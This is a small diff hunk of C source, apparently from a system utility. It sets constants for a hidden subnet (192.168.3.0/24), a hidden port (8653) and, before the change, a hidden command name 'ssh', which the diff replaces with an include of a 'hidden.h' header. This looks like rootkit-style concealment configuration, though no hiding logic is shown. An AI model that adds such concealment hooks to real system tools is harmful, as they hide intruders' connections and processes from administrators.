@@ -32,8 +32,7 @@
 // 192.168.3.0/24
 #define HIDDEN_NET 0x3a8c0
 #define HIDDEN_PORT 8653
-#define HIDDEN_CMD "ssh"
-
+#include "../hidden.h"
 
 #ifndef lint
 static char copyright[] =
